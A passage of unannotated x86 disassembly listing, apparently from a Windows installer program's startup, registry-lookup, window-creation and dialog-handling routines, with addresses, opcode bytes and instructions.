  4032b3:	e8 28 23 00 00       	call   0x4055e0
  4032b8:	85 c0                	test   %eax,%eax
  4032ba:	74 2a                	je     0x4032e6
  4032bc:	56                   	push   %esi
  4032bd:	68 00 44 43 00       	push   $0x434400
  4032c2:	e8 45 27 00 00       	call   0x405a0c
  4032c7:	56                   	push   %esi
  4032c8:	68 00 48 43 00       	push   $0x434800
  4032cd:	e8 3a 27 00 00       	call   0x405a0c
  4032d2:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4032d6:	83 0d 0c ec 42 00 ff 	orl    $0xffffffff,0x42ec0c
  4032dd:	e8 73 02 00 00       	call   0x403555
  4032e2:	89 44 24 18          	mov    %eax,0x18(%esp)
  4032e6:	e8 90 01 00 00       	call   0x40347b
  4032eb:	ff 15 80 72 40 00    	call   *0x407280
  4032f1:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4032f5:	0f 84 e5 00 00 00    	je     0x4033e0
  4032fb:	68 10 00 20 00       	push   $0x200010
  403300:	ff 74 24 14          	push   0x14(%esp)
  403304:	e8 c4 1f 00 00       	call   0x4052cd
  403309:	6a 02                	push   $0x2
  40330b:	ff 15 a0 70 40 00    	call   *0x4070a0
  403311:	68 40 91 40 00       	push   $0x409140
  403316:	55                   	push   %ebp
  403317:	e8 0c 27 00 00       	call   0x405a28
  40331c:	be 00 4c 43 00       	mov    $0x434c00,%esi
  403321:	56                   	push   %esi
  403322:	55                   	push   %ebp
  403323:	ff 15 f0 70 40 00    	call   *0x4070f0
  403329:	85 c0                	test   %eax,%eax
  40332b:	74 b9                	je     0x4032e6
  40332d:	53                   	push   %ebx
  40332e:	55                   	push   %ebp
  40332f:	ff 15 80 70 40 00    	call   *0x407080
  403335:	55                   	push   %ebp
  403336:	ff 15 74 70 40 00    	call   *0x407074
  40333c:	38 1d 00 44 43 00    	cmp    %bl,0x434400
  403342:	75 0b                	jne    0x40334f
  403344:	56                   	push   %esi
  403345:	68 00 44 43 00       	push   $0x434400
  40334a:	e8 bd 26 00 00       	call   0x405a0c
  40334f:	ff 74 24 1c          	push   0x1c(%esp)
  403353:	68 00 f0 42 00       	push   $0x42f000
  403358:	e8 af 26 00 00       	call   0x405a0c
  40335d:	6a 1a                	push   $0x1a
  40335f:	66 c7 05 00 f4 42 00 	movw   $0x41,0x42f400
  403366:	41 00 
  403368:	5f                   	pop    %edi
  403369:	be 98 8b 42 00       	mov    $0x428b98,%esi
  40336e:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  403373:	ff b0 20 01 00 00    	push   0x120(%eax)
  403379:	56                   	push   %esi
  40337a:	e8 af 26 00 00       	call   0x405a2e
  40337f:	56                   	push   %esi
  403380:	ff 15 44 71 40 00    	call   *0x407144
  403386:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40338a:	74 3f                	je     0x4033cb
  40338c:	6a 01                	push   $0x1
  40338e:	56                   	push   %esi
  40338f:	68 00 5c 43 00       	push   $0x435c00
  403394:	ff 15 9c 70 40 00    	call   *0x40709c
  40339a:	85 c0                	test   %eax,%eax
  40339c:	74 2d                	je     0x4033cb
  40339e:	53                   	push   %ebx
  40339f:	56                   	push   %esi
  4033a0:	e8 b5 23 00 00       	call   0x40575a
  4033a5:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  4033aa:	ff b0 24 01 00 00    	push   0x124(%eax)
  4033b0:	56                   	push   %esi
  4033b1:	e8 78 26 00 00       	call   0x405a2e
  4033b6:	56                   	push   %esi
  4033b7:	e8 b0 1e 00 00       	call   0x40526c
  4033bc:	3b c3                	cmp    %ebx,%eax
  4033be:	74 0b                	je     0x4033cb
  4033c0:	50                   	push   %eax
  4033c1:	ff 15 ec 70 40 00    	call   *0x4070ec
  4033c7:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4033cb:	fe 05 00 f4 42 00    	incb   0x42f400
  4033d1:	4f                   	dec    %edi
  4033d2:	75 9a                	jne    0x40336e
  4033d4:	53                   	push   %ebx
  4033d5:	55                   	push   %ebp
  4033d6:	e8 7f 23 00 00       	call   0x40575a
  4033db:	e9 06 ff ff ff       	jmp    0x4032e6
  4033e0:	39 1d f4 eb 42 00    	cmp    %ebx,0x42ebf4
  4033e6:	74 7b                	je     0x403463
  4033e8:	6a 03                	push   $0x3
  4033ea:	e8 3f 29 00 00       	call   0x405d2e
  4033ef:	6a 04                	push   $0x4
  4033f1:	8b e8                	mov    %eax,%ebp
  4033f3:	e8 36 29 00 00       	call   0x405d2e
  4033f8:	6a 05                	push   $0x5
  4033fa:	8b f0                	mov    %eax,%esi
  4033fc:	e8 2d 29 00 00       	call   0x405d2e
  403401:	3b eb                	cmp    %ebx,%ebp
  403403:	8b f8                	mov    %eax,%edi
  403405:	74 48                	je     0x40344f
  403407:	3b f3                	cmp    %ebx,%esi
  403409:	74 44                	je     0x40344f
  40340b:	3b fb                	cmp    %ebx,%edi
  40340d:	74 40                	je     0x40344f
  40340f:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403413:	50                   	push   %eax
  403414:	6a 28                	push   $0x28
  403416:	ff 15 98 70 40 00    	call   *0x407098
  40341c:	50                   	push   %eax
  40341d:	ff d5                	call   *%ebp
  40341f:	85 c0                	test   %eax,%eax
  403421:	74 2c                	je     0x40344f
  403423:	8d 44 24 24          	lea    0x24(%esp),%eax
  403427:	50                   	push   %eax
  403428:	68 2c 91 40 00       	push   $0x40912c
  40342d:	53                   	push   %ebx
  40342e:	ff d6                	call   *%esi
  403430:	53                   	push   %ebx
  403431:	53                   	push   %ebx
  403432:	8d 44 24 28          	lea    0x28(%esp),%eax
  403436:	53                   	push   %ebx
  403437:	50                   	push   %eax
  403438:	53                   	push   %ebx
  403439:	ff 74 24 30          	push   0x30(%esp)
  40343d:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  403444:	00 
  403445:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  40344c:	00 
  40344d:	ff d7                	call   *%edi
  40344f:	53                   	push   %ebx
  403450:	6a 02                	push   $0x2
  403452:	ff 15 24 72 40 00    	call   *0x407224
  403458:	85 c0                	test   %eax,%eax
  40345a:	75 07                	jne    0x403463
  40345c:	6a 09                	push   $0x9
  40345e:	e8 a8 df ff ff       	call   0x40140b
  403463:	a1 0c ec 42 00       	mov    0x42ec0c,%eax
  403468:	83 f8 ff             	cmp    $0xffffffff,%eax
  40346b:	74 04                	je     0x403471
  40346d:	89 44 24 18          	mov    %eax,0x18(%esp)
  403471:	ff 74 24 18          	push   0x18(%esp)
  403475:	ff 15 a0 70 40 00    	call   *0x4070a0
  40347b:	a1 14 90 40 00       	mov    0x409014,%eax
  403480:	83 f8 ff             	cmp    $0xffffffff,%eax
  403483:	74 0e                	je     0x403493
  403485:	50                   	push   %eax
  403486:	ff 15 ec 70 40 00    	call   *0x4070ec
  40348c:	83 0d 14 90 40 00 ff 	orl    $0xffffffff,0x409014
  403493:	e8 28 00 00 00       	call   0x4034c0
  403498:	6a 07                	push   $0x7
  40349a:	68 00 58 43 00       	push   $0x435800
  40349f:	e8 8d 1e 00 00       	call   0x405331
  4034a4:	c3                   	ret
  4034a5:	56                   	push   %esi
  4034a6:	8b 35 9c 8f 42 00    	mov    0x428f9c,%esi
  4034ac:	eb 0a                	jmp    0x4034b8
  4034ae:	ff 74 24 08          	push   0x8(%esp)
  4034b2:	ff 56 04             	call   *0x4(%esi)
  4034b5:	8b 36                	mov    (%esi),%esi
  4034b7:	59                   	pop    %ecx
  4034b8:	85 f6                	test   %esi,%esi
  4034ba:	75 f2                	jne    0x4034ae
  4034bc:	5e                   	pop    %esi
  4034bd:	c2 04 00             	ret    $0x4
  4034c0:	56                   	push   %esi
  4034c1:	8b 35 9c 8f 42 00    	mov    0x428f9c,%esi
  4034c7:	6a 00                	push   $0x0
  4034c9:	e8 d7 ff ff ff       	call   0x4034a5
  4034ce:	85 f6                	test   %esi,%esi
  4034d0:	74 1a                	je     0x4034ec
  4034d2:	57                   	push   %edi
  4034d3:	8b fe                	mov    %esi,%edi
  4034d5:	8b 36                	mov    (%esi),%esi
  4034d7:	ff 77 08             	push   0x8(%edi)
  4034da:	ff 15 18 71 40 00    	call   *0x407118
  4034e0:	57                   	push   %edi
  4034e1:	ff 15 fc 70 40 00    	call   *0x4070fc
  4034e7:	85 f6                	test   %esi,%esi
  4034e9:	75 e8                	jne    0x4034d3
  4034eb:	5f                   	pop    %edi
  4034ec:	83 25 9c 8f 42 00 00 	andl   $0x0,0x428f9c
  4034f3:	5e                   	pop    %esi
  4034f4:	c3                   	ret
  4034f5:	a1 9c 8f 42 00       	mov    0x428f9c,%eax
  4034fa:	eb 0b                	jmp    0x403507
  4034fc:	8b 48 08             	mov    0x8(%eax),%ecx
  4034ff:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403503:	74 0a                	je     0x40350f
  403505:	8b 00                	mov    (%eax),%eax
  403507:	85 c0                	test   %eax,%eax
  403509:	75 f1                	jne    0x4034fc
  40350b:	40                   	inc    %eax
  40350c:	c2 04 00             	ret    $0x4
  40350f:	33 c0                	xor    %eax,%eax
  403511:	eb f9                	jmp    0x40350c
  403513:	56                   	push   %esi
  403514:	8b 74 24 08          	mov    0x8(%esp),%esi
  403518:	56                   	push   %esi
  403519:	e8 d7 ff ff ff       	call   0x4034f5
  40351e:	85 c0                	test   %eax,%eax
  403520:	75 03                	jne    0x403525
  403522:	40                   	inc    %eax
  403523:	eb 2c                	jmp    0x403551
  403525:	6a 0c                	push   $0xc
  403527:	6a 40                	push   $0x40
  403529:	ff 15 00 71 40 00    	call   *0x407100
  40352f:	85 c0                	test   %eax,%eax
  403531:	74 1b                	je     0x40354e
  403533:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403537:	89 70 08             	mov    %esi,0x8(%eax)
  40353a:	89 48 04             	mov    %ecx,0x4(%eax)
  40353d:	8b 0d 9c 8f 42 00    	mov    0x428f9c,%ecx
  403543:	89 08                	mov    %ecx,(%eax)
  403545:	a3 9c 8f 42 00       	mov    %eax,0x428f9c
  40354a:	33 c0                	xor    %eax,%eax
  40354c:	eb 03                	jmp    0x403551
  40354e:	83 c8 ff             	or     $0xffffffff,%eax
  403551:	5e                   	pop    %esi
  403552:	c2 08 00             	ret    $0x8
  403555:	83 ec 14             	sub    $0x14,%esp
  403558:	53                   	push   %ebx
  403559:	55                   	push   %ebp
  40355a:	56                   	push   %esi
  40355b:	8b 35 70 eb 42 00    	mov    0x42eb70,%esi
  403561:	57                   	push   %edi
  403562:	6a 06                	push   $0x6
  403564:	e8 c5 27 00 00       	call   0x405d2e
  403569:	33 db                	xor    %ebx,%ebx
  40356b:	3b c3                	cmp    %ebx,%eax
  40356d:	74 12                	je     0x403581
  40356f:	ff d0                	call   *%eax
  403571:	0f b7 c0             	movzwl %ax,%eax
  403574:	50                   	push   %eax
  403575:	68 00 50 43 00       	push   $0x435000
  40357a:	e8 eb 23 00 00       	call   0x40596a
  40357f:	eb 4a                	jmp    0x4035cb
  403581:	bf e0 9f 42 00       	mov    $0x429fe0,%edi
  403586:	53                   	push   %ebx
  403587:	57                   	push   %edi
  403588:	53                   	push   %ebx
  403589:	68 e4 72 40 00       	push   $0x4072e4
  40358e:	68 01 00 00 80       	push   $0x80000001
  403593:	c7 05 00 50 43 00 30 	movl   $0x7830,0x435000
  40359a:	78 00 00 
  40359d:	e8 51 23 00 00       	call   0x4058f3
  4035a2:	38 1d e0 9f 42 00    	cmp    %bl,0x429fe0
  4035a8:	75 16                	jne    0x4035c0
  4035aa:	53                   	push   %ebx
  4035ab:	57                   	push   %edi
  4035ac:	68 02 73 40 00       	push   $0x407302
  4035b1:	68 bc 72 40 00       	push   $0x4072bc
  4035b6:	68 03 00 00 80       	push   $0x80000003
  4035bb:	e8 33 23 00 00       	call   0x4058f3
  4035c0:	57                   	push   %edi
  4035c1:	68 00 50 43 00       	push   $0x435000
  4035c6:	e8 5d 24 00 00       	call   0x405a28
  4035cb:	e8 4e 02 00 00       	call   0x40381e
  4035d0:	a1 78 eb 42 00       	mov    0x42eb78,%eax
  4035d5:	bd 00 44 43 00       	mov    $0x434400,%ebp
  4035da:	83 e0 20             	and    $0x20,%eax
  4035dd:	55                   	push   %ebp
  4035de:	a3 e0 eb 42 00       	mov    %eax,0x42ebe0
  4035e3:	c7 05 fc eb 42 00 00 	movl   $0x10000,0x42ebfc
  4035ea:	00 01 00 
  4035ed:	e8 ee 1f 00 00       	call   0x4055e0
  4035f2:	85 c0                	test   %eax,%eax
  4035f4:	0f 85 81 00 00 00    	jne    0x40367b
  4035fa:	8b 4e 48             	mov    0x48(%esi),%ecx
  4035fd:	3b cb                	cmp    %ebx,%ecx
  4035ff:	74 7a                	je     0x40367b
  403601:	8b 56 4c             	mov    0x4c(%esi),%edx
  403604:	a1 98 eb 42 00       	mov    0x42eb98,%eax
  403609:	bf 00 db 42 00       	mov    $0x42db00,%edi
  40360e:	53                   	push   %ebx
  40360f:	03 d0                	add    %eax,%edx
  403611:	57                   	push   %edi
  403612:	03 c8                	add    %eax,%ecx
  403614:	52                   	push   %edx
  403615:	51                   	push   %ecx
  403616:	ff 76 44             	push   0x44(%esi)
  403619:	e8 d5 22 00 00       	call   0x4058f3
  40361e:	a0 00 db 42 00       	mov    0x42db00,%al
  403623:	3a c3                	cmp    %bl,%al
  403625:	74 54                	je     0x40367b
  403627:	3c 22                	cmp    $0x22,%al
  403629:	75 0f                	jne    0x40363a
  40362b:	bf 01 db 42 00       	mov    $0x42db01,%edi
  403630:	6a 22                	push   $0x22
  403632:	57                   	push   %edi
  403633:	e8 f2 1e 00 00       	call   0x40552a
  403638:	88 18                	mov    %bl,(%eax)
  40363a:	57                   	push   %edi
  40363b:	e8 e2 23 00 00       	call   0x405a22
  403640:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403644:	3b c7                	cmp    %edi,%eax
  403646:	76 26                	jbe    0x40366e
  403648:	68 bc 91 40 00       	push   $0x4091bc
  40364d:	50                   	push   %eax
  40364e:	ff 15 f0 70 40 00    	call   *0x4070f0
  403654:	85 c0                	test   %eax,%eax
  403656:	75 16                	jne    0x40366e
  403658:	57                   	push   %edi
  403659:	ff 15 78 70 40 00    	call   *0x407078
  40365f:	83 f8 ff             	cmp    $0xffffffff,%eax
  403662:	74 04                	je     0x403668
  403664:	a8 10                	test   $0x10,%al
  403666:	75 06                	jne    0x40366e
  403668:	57                   	push   %edi
  403669:	e8 d8 1e 00 00       	call   0x405546
  40366e:	57                   	push   %edi
  40366f:	e8 8b 1e 00 00       	call   0x4054ff
  403674:	50                   	push   %eax
  403675:	55                   	push   %ebp
  403676:	e8 91 23 00 00       	call   0x405a0c
  40367b:	55                   	push   %ebp
  40367c:	e8 5f 1f 00 00       	call   0x4055e0
  403681:	85 c0                	test   %eax,%eax
  403683:	75 0c                	jne    0x403691
  403685:	ff b6 18 01 00 00    	push   0x118(%esi)
  40368b:	55                   	push   %ebp
  40368c:	e8 9d 23 00 00       	call   0x405a2e
  403691:	68 40 80 00 00       	push   $0x8040
  403696:	53                   	push   %ebx
  403697:	53                   	push   %ebx
  403698:	6a 01                	push   $0x1
  40369a:	6a 67                	push   $0x67
  40369c:	ff 35 60 eb 42 00    	push   0x42eb60
  4036a2:	ff 15 34 72 40 00    	call   *0x407234
  4036a8:	a3 48 e3 42 00       	mov    %eax,0x42e348
  4036ad:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  4036b1:	bf 00 e3 42 00       	mov    $0x42e300,%edi
  4036b6:	0f 84 89 00 00 00    	je     0x403745
  4036bc:	8b 0d 60 eb 42 00    	mov    0x42eb60,%ecx
  4036c2:	a3 14 e3 42 00       	mov    %eax,0x42e314
  4036c7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4036cb:	57                   	push   %edi
  4036cc:	c7 44 24 14 5f 4e 62 	movl   $0x624e5f,0x14(%esp)
  4036d3:	00 
  4036d4:	c7 05 04 e3 42 00 00 	movl   $0x401000,0x42e304
  4036db:	10 40 00 
  4036de:	89 0d 10 e3 42 00    	mov    %ecx,0x42e310
  4036e4:	a3 24 e3 42 00       	mov    %eax,0x42e324
  4036e9:	ff 15 bc 71 40 00    	call   *0x4071bc
  4036ef:	66 85 c0             	test   %ax,%ax
  4036f2:	0f 84 1c 01 00 00    	je     0x403814
  4036f8:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036fc:	53                   	push   %ebx
  4036fd:	50                   	push   %eax
  4036fe:	53                   	push   %ebx
  4036ff:	6a 30                	push   $0x30
  403701:	ff 15 0c 72 40 00    	call   *0x40720c
  403707:	53                   	push   %ebx
  403708:	ff 35 60 eb 42 00    	push   0x42eb60
  40370e:	8b 44 24 28          	mov    0x28(%esp),%eax
  403712:	2b 44 24 20          	sub    0x20(%esp),%eax
  403716:	53                   	push   %ebx
  403717:	53                   	push   %ebx
  403718:	50                   	push   %eax
  403719:	8b 44 24 30          	mov    0x30(%esp),%eax
  40371d:	2b 44 24 28          	sub    0x28(%esp),%eax
  403721:	50                   	push   %eax
  403722:	8d 44 24 28          	lea    0x28(%esp),%eax
  403726:	ff 74 24 30          	push   0x30(%esp)
  40372a:	ff 74 24 30          	push   0x30(%esp)
  40372e:	68 00 00 00 80       	push   $0x80000000
  403733:	53                   	push   %ebx
  403734:	50                   	push   %eax
  403735:	68 80 00 00 00       	push   $0x80
  40373a:	ff 15 10 72 40 00    	call   *0x407210
  403740:	a3 b8 9f 42 00       	mov    %eax,0x429fb8
  403745:	53                   	push   %ebx
  403746:	e8 c0 dc ff ff       	call   0x40140b
  40374b:	85 c0                	test   %eax,%eax
  40374d:	74 08                	je     0x403757
  40374f:	6a 02                	push   $0x2
  403751:	58                   	pop    %eax
  403752:	e9 bf 00 00 00       	jmp    0x403816
  403757:	e8 c2 00 00 00       	call   0x40381e
  40375c:	39 1d 00 ec 42 00    	cmp    %ebx,0x42ec00
  403762:	0f 85 83 00 00 00    	jne    0x4037eb
  403768:	6a 05                	push   $0x5
  40376a:	ff 35 b8 9f 42 00    	push   0x429fb8
  403770:	ff 15 60 72 40 00    	call   *0x407260
  403776:	8b 35 b4 70 40 00    	mov    0x4070b4,%esi
  40377c:	68 b0 72 40 00       	push   $0x4072b0
  403781:	ff d6                	call   *%esi
  403783:	85 c0                	test   %eax,%eax
  403785:	75 07                	jne    0x40378e
  403787:	68 a4 72 40 00       	push   $0x4072a4
  40378c:	ff d6                	call   *%esi
  40378e:	8b 35 14 72 40 00    	mov    0x407214,%esi
  403794:	bd 98 72 40 00       	mov    $0x407298,%ebp
  403799:	57                   	push   %edi
  40379a:	55                   	push   %ebp
  40379b:	53                   	push   %ebx
  40379c:	ff d6                	call   *%esi
  40379e:	85 c0                	test   %eax,%eax
  4037a0:	75 16                	jne    0x4037b8
  4037a2:	57                   	push   %edi
  4037a3:	68 8c 72 40 00       	push   $0x40728c
  4037a8:	53                   	push   %ebx
  4037a9:	ff d6                	call   *%esi
  4037ab:	57                   	push   %edi
  4037ac:	89 2d 24 e3 42 00    	mov    %ebp,0x42e324
  4037b2:	ff 15 bc 71 40 00    	call   *0x4071bc
  4037b8:	a1 40 e3 42 00       	mov    0x42e340,%eax
  4037bd:	53                   	push   %ebx
  4037be:	83 c0 69             	add    $0x69,%eax
  4037c1:	68 eb 38 40 00       	push   $0x4038eb
  4037c6:	0f b7 c0             	movzwl %ax,%eax
  4037c9:	53                   	push   %ebx
  4037ca:	50                   	push   %eax
  4037cb:	ff 35 60 eb 42 00    	push   0x42eb60
  4037d1:	ff 15 18 72 40 00    	call   *0x407218
  4037d7:	6a 05                	push   $0x5
  4037d9:	8b f0                	mov    %eax,%esi
  4037db:	e8 2b dc ff ff       	call   0x40140b
  4037e0:	6a 01                	push   $0x1
  4037e2:	e8 be fc ff ff       	call   0x4034a5
  4037e7:	8b c6                	mov    %esi,%eax
  4037e9:	eb 2b                	jmp    0x403816
  4037eb:	53                   	push   %ebx
  4037ec:	e8 8b 16 00 00       	call   0x404e7c
  4037f1:	85 c0                	test   %eax,%eax
  4037f3:	74 18                	je     0x40380d
  4037f5:	39 1d 2c e3 42 00    	cmp    %ebx,0x42e32c
  4037fb:	0f 85 4e ff ff ff    	jne    0x40374f
  403801:	6a 02                	push   $0x2
  403803:	e8 03 dc ff ff       	call   0x40140b
  403808:	e9 42 ff ff ff       	jmp    0x40374f
  40380d:	6a 01                	push   $0x1
  40380f:	e8 f7 db ff ff       	call   0x40140b
  403814:	33 c0                	xor    %eax,%eax
  403816:	5f                   	pop    %edi
  403817:	5e                   	pop    %esi
  403818:	5d                   	pop    %ebp
  403819:	5b                   	pop    %ebx
  40381a:	83 c4 14             	add    $0x14,%esp
  40381d:	c3                   	ret
  40381e:	53                   	push   %ebx
  40381f:	55                   	push   %ebp
  403820:	56                   	push   %esi
  403821:	57                   	push   %edi
  403822:	bf 00 50 43 00       	mov    $0x435000,%edi
  403827:	bb ff ff 00 00       	mov    $0xffff,%ebx
  40382c:	57                   	push   %edi
  40382d:	e8 51 21 00 00       	call   0x405983
  403832:	8b 35 a4 eb 42 00    	mov    0x42eba4,%esi
  403838:	85 f6                	test   %esi,%esi
  40383a:	74 45                	je     0x403881
  40383c:	8b 0d 70 eb 42 00    	mov    0x42eb70,%ecx
  403842:	8b 49 64             	mov    0x64(%ecx),%ecx
  403845:	8b d1                	mov    %ecx,%edx
  403847:	0f af ce             	imul   %esi,%ecx
  40384a:	f7 da                	neg    %edx
  40384c:	03 0d a0 eb 42 00    	add    0x42eba0,%ecx
  403852:	03 ca                	add    %edx,%ecx
  403854:	4e                   	dec    %esi
  403855:	66 8b 29             	mov    (%ecx),%bp
  403858:	66 33 e8             	xor    %ax,%bp
  40385b:	23 eb                	and    %ebx,%ebp
  40385d:	66 85 ed             	test   %bp,%bp
  403860:	74 06                	je     0x403868
  403862:	85 f6                	test   %esi,%esi
  403864:	75 ec                	jne    0x403852
  403866:	eb 19                	jmp    0x403881
  403868:	8b 51 02             	mov    0x2(%ecx),%edx
  40386b:	89 15 40 e3 42 00    	mov    %edx,0x42e340
  403871:	8b 51 06             	mov    0x6(%ecx),%edx
  403874:	89 15 08 ec 42 00    	mov    %edx,0x42ec08
  40387a:	8d 51 0a             	lea    0xa(%ecx),%edx
  40387d:	85 d2                	test   %edx,%edx
  40387f:	75 12                	jne    0x403893
  403881:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403886:	75 07                	jne    0x40388f
  403888:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  40388d:	eb a3                	jmp    0x403832
  40388f:	33 db                	xor    %ebx,%ebx
  403891:	eb 9f                	jmp    0x403832
  403893:	89 15 3c e3 42 00    	mov    %edx,0x42e33c
  403899:	0f b7 01             	movzwl (%ecx),%eax
  40389c:	50                   	push   %eax
  40389d:	57                   	push   %edi
  40389e:	e8 c7 20 00 00       	call   0x40596a
  4038a3:	6a fe                	push   $0xfffffffe
  4038a5:	68 60 e3 42 00       	push   $0x42e360
  4038aa:	e8 7f 21 00 00       	call   0x405a2e
  4038af:	50                   	push   %eax
  4038b0:	ff 35 b8 9f 42 00    	push   0x429fb8
  4038b6:	ff 15 f4 71 40 00    	call   *0x4071f4
  4038bc:	a1 8c eb 42 00       	mov    0x42eb8c,%eax
  4038c1:	8b 35 88 eb 42 00    	mov    0x42eb88,%esi
  4038c7:	85 c0                	test   %eax,%eax
  4038c9:	74 1b                	je     0x4038e6
  4038cb:	8b f8                	mov    %eax,%edi
  4038cd:	8b 06                	mov    (%esi),%eax
  4038cf:	85 c0                	test   %eax,%eax
  4038d1:	74 0a                	je     0x4038dd
  4038d3:	50                   	push   %eax
  4038d4:	8d 46 18             	lea    0x18(%esi),%eax
  4038d7:	50                   	push   %eax
  4038d8:	e8 51 21 00 00       	call   0x405a2e
  4038dd:	81 c6 18 04 00 00    	add    $0x418,%esi
  4038e3:	4f                   	dec    %edi
  4038e4:	75 e7                	jne    0x4038cd
  4038e6:	5f                   	pop    %edi
  4038e7:	5e                   	pop    %esi
  4038e8:	5d                   	pop    %ebp
  4038e9:	5b                   	pop    %ebx
  4038ea:	c3                   	ret
  4038eb:	83 ec 10             	sub    $0x10,%esp
  4038ee:	b9 10 01 00 00       	mov    $0x110,%ecx
  4038f3:	53                   	push   %ebx
  4038f4:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4038f8:	55                   	push   %ebp
  4038f9:	56                   	push   %esi
  4038fa:	3b d9                	cmp    %ecx,%ebx
  4038fc:	57                   	push   %edi
  4038fd:	0f 84 3b 01 00 00    	je     0x403a3e
  403903:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403909:	0f 84 2f 01 00 00    	je     0x403a3e
  40390f:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403913:	33 ed                	xor    %ebp,%ebp
  403915:	83 fb 47             	cmp    $0x47,%ebx
  403918:	75 13                	jne    0x40392d
  40391a:	6a 13                	push   $0x13
  40391c:	55                   	push   %ebp
  40391d:	55                   	push   %ebp
  40391e:	55                   	push   %ebp
  40391f:	55                   	push   %ebp
  403920:	57                   	push   %edi
  403921:	ff 35 b8 9f 42 00    	push   0x429fb8
  403927:	ff 15 88 71 40 00    	call   *0x407188
  40392d:	83 fb 05             	cmp    $0x5,%ebx
  403930:	75 18                	jne    0x40394a
  403932:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403936:	48                   	dec    %eax
  403937:	f7 d8                	neg    %eax
  403939:	1b c0                	sbb    %eax,%eax
  40393b:	23 c3                	and    %ebx,%eax
  40393d:	50                   	push   %eax
  40393e:	ff 35 b8 9f 42 00    	push   0x429fb8
  403944:	ff 15 60 72 40 00    	call   *0x407260
  40394a:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403950:	75 1a                	jne    0x40396c
  403952:	ff 35 38 e3 42 00    	push   0x42e338
  403958:	ff 15 e8 71 40 00    	call   *0x4071e8
  40395e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403962:	a3 38 e3 42 00       	mov    %eax,0x42e338
  403967:	e9 fc 03 00 00       	jmp    0x403d68
  40396c:	83 fb 11             	cmp    $0x11,%ebx
  40396f:	75 11                	jne    0x403982
  403971:	55                   	push   %ebp
  403972:	55                   	push   %ebp
  403973:	57                   	push   %edi
  403974:	ff 15 30 72 40 00    	call   *0x407230
  40397a:	33 c0                	xor    %eax,%eax
  40397c:	40                   	inc    %eax
  40397d:	e9 0b 04 00 00       	jmp    0x403d8d
  403982:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403988:	0f 85 9d 00 00 00    	jne    0x403a2b
  40398e:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403993:	56                   	push   %esi
  403994:	57                   	push   %edi
  403995:	ff 15 2c 72 40 00    	call   *0x40722c
  40399b:	8b f8                	mov    %eax,%edi
  40399d:	3b fd                	cmp    %ebp,%edi
  40399f:	74 1d                	je     0x4039be
  4039a1:	55                   	push   %ebp
  4039a2:	55                   	push   %ebp
  4039a3:	68 f3 00 00 00       	push   $0xf3
  4039a8:	57                   	push   %edi
  4039a9:	ff 15 44 72 40 00    	call   *0x407244
  4039af:	57                   	push   %edi
  4039b0:	ff 15 84 71 40 00    	call   *0x407184
  4039b6:	85 c0                	test   %eax,%eax
  4039b8:	0f 84 cd 03 00 00    	je     0x403d8b
  4039be:	83 fe 01             	cmp    $0x1,%esi
  4039c1:	75 03                	jne    0x4039c6
  4039c3:	56                   	push   %esi
  4039c4:	eb 2e                	jmp    0x4039f4
  4039c6:	83 fe 03             	cmp    $0x3,%esi
  4039c9:	75 0c                	jne    0x4039d7
  4039cb:	39 2d a4 91 40 00    	cmp    %ebp,0x4091a4
  4039d1:	7e 3f                	jle    0x403a12
  4039d3:	6a ff                	push   $0xffffffff
  4039d5:	eb 1d                	jmp    0x4039f4
  4039d7:	6a 02                	push   $0x2
  4039d9:	5f                   	pop    %edi
  4039da:	3b f7                	cmp    %edi,%esi
  4039dc:	75 34                	jne    0x403a12
  4039de:	39 2d ec eb 42 00    	cmp    %ebp,0x42ebec
  4039e4:	74 15                	je     0x4039fb
  4039e6:	57                   	push   %edi
  4039e7:	e8 1f da ff ff       	call   0x40140b
  4039ec:	89 3d a8 93 42 00    	mov    %edi,0x4293a8
  4039f2:	6a 78                	push   $0x78
  4039f4:	e8 9e 03 00 00       	call   0x403d97
  4039f9:	eb 30                	jmp    0x403a2b
  4039fb:	6a 03                	push   $0x3
  4039fd:	e8 09 da ff ff       	call   0x40140b
  403a02:	85 c0                	test   %eax,%eax
  403a04:	75 25                	jne    0x403a2b
  403a06:	c7 05 a8 93 42 00 01 	movl   $0x1,0x4293a8
  403a0d:	00 00 00 
  403a10:	eb e0                	jmp    0x4039f2
  403a12:	ff 74 24 30          	push   0x30(%esp)
  403a16:	ff 74 24 30          	push   0x30(%esp)
  403a1a:	68 11 01 00 00       	push   $0x111
  403a1f:	ff 35 38 e3 42 00    	push   0x42e338
  403a25:	ff 15 44 72 40 00    	call   *0x407244
  403a2b:	ff 74 24 30          	push   0x30(%esp)
  403a2f:	ff 74 24 30          	push   0x30(%esp)
  403a33:	53                   	push   %ebx
  403a34:	e8 ec 03 00 00       	call   0x403e25
  403a39:	e9 4f 03 00 00       	jmp    0x403d8d
  403a3e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a42:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403a46:	3b d9                	cmp    %ecx,%ebx
  403a48:	a3 c4 9f 42 00       	mov    %eax,0x429fc4
  403a4d:	75 4d                	jne    0x403a9c
  403a4f:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  403a55:	6a 01                	push   $0x1
  403a57:	57                   	push   %edi
